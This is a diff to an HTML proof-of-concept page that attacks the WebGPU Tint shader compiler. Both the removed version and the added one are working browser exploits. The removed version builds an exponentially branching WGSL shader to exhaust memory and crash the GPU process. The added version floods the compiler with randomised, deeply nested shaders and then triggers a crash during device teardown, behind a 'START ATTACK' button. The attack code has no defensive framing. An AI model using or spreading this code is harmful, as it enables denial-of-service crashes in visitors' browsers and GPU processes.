@@ -1,52 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebGPU Tint AST Exhaustion PoC</title>
-    <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
+    <title>Tint AST Teardown DoS</title>
+    <style>body { font-family: monospace; background: #111; color: #0f0; font-size: 18px; }</style>
 </head>
 <body>
-    <h2>Tint AST Memory Exhaustion (SIGTRAP)</h2>
-    <p>Clicking the button builds a 4-million branch WGSL shader to OOM the GPU process.</p>
-    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">CRASH GPU</button>
-    <div id="status" style="margin-top: 20px;">Waiting...</div>
+    <h2>Tint AST Teardown Crash</h2>
+    <p>Click START. The page will spam the GPU for 10 seconds, then trigger the teardown.</p>
+    <button id="crashBtn" style="padding: 20px; background: red; color: white; cursor:pointer;">START ATTACK</button>
+    <div id="status" style="margin-top: 20px;"></div>
 
     <script>
         const statusEl = document.getElementById('status');
 
-        // Exponentially branching AST generator
-        function generateMassiveAST(depth) {
-            if (depth <= 0) return `return vec4<f32>(1.0);`;
-            const branch = generateMassiveAST(depth - 1);
-            return `if (true) { ${branch} } else { ${branch} }`;
+        function buildKillerShader() {
+            let mathExpr = "(1.0)";
+            const ops = ['+', '-', '*', '/'];
+            
+            // Jitter depth to ensure unique parsing trees
+            const depth = 160 + Math.floor(Math.random() * 5);
+            for (let i = 0; i < depth; i++) {
+                mathExpr = `(${mathExpr} ${ops[i%4]} vec4<f32>(1.0).x)`;
+            }
+            
+            return `
+                // CACHE BUSTER: ${Math.random()}
+                @vertex fn vs_main() -> @builtin(position) vec4<f32> {
+                    let crazy_var = ${mathExpr};
+                    return vec4<f32>(crazy_var);
+                }
+            `;
         }
 
         async function triggerCrash() {
-            if (!navigator.gpu) {
-                statusEl.innerText = "WebGPU is not supported.";
-                return;
-            }
-
+            if (!navigator.gpu) return;
             const adapter = await navigator.gpu.requestAdapter();
             const device = await adapter.requestDevice();
 
-            statusEl.innerText = "Building massive WGSL string in JavaScript (Please wait)...";
-            
-            // Depth 22 = ~4.1 million branches. 
-            // Avoids JS RangeError, but guarantees C++ Tint AST OOM.
-            setTimeout(() => {
-                try {
-                    const body = generateMassiveAST(22);
-                    const killerWGSL = `@vertex fn vs_main() -> @builtin(position) vec4<f32> {\n${body}\n}`;
-                    
-                    statusEl.innerText = "String built! Sending to Tint Compiler. Brace for Aw, Snap...";
-                    
-                    // This instantly crashes the Android GPU Process (SIGTRAP)
-                    device.createShaderModule({ code: killerWGSL });
-                    
-                } catch (e) {
-                    statusEl.innerText = "JS Error (Try lowering depth to 21 if RangeError occurs): " + e.message;
+            statusEl.innerText = "Spamming Tint Compiler. Building memory pressure (Wait 10s)...";
+
+            let count = 0;
+            // Spam the GPU process
+            const spammer = setInterval(() => {
+                for (let i = 0; i < 50; i++) {
+                    count++;
+                    try {
+                        device.createShaderModule({ code: buildKillerShader() });
+                    } catch (e) {}
                 }
-            }, 100); 
+                if (count % 1000 === 0) {
+                    statusEl.innerText = `Sent ${count} payloads to GPU process...`;
+                }
+            }, 10);
+
+            // Wait 10 seconds for the C++ memory to fill up, then trigger the spike
+            setTimeout(() => {
+                clearInterval(spammer);
+                statusEl.innerText = "Triggering WebGPU Device Destructors (Teardown)...";
+                
+                // Explicitly force the C++ GPU Process to execute the cleanup destructors
+                device.destroy();
+                
+                // Fallback: reload the page 1 second later just in case device.destroy() isn't enough
+                setTimeout(() => window.location.reload(), 1000);
+            }, 16000); // 10,000 milliseconds = 10 seconds
         }
 
         document.getElementById('crashBtn').addEventListener('click', triggerCrash);
